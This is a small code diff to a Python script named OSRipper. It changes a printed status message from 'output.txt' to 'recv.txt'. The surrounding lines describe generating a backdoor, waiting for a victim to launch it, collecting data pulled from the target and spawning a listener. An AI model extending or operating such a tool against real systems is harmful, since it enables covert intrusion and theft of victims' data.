@@ -795,7 +795,7 @@ if nscan == "2":
     if reps == True:
         print("Generated in dist")
         print(
-            "OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target"
+            "OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called recv.txt with all the data that has been pulled of the target"
         )
         print("After that the listener will spawn instantly")
         server()
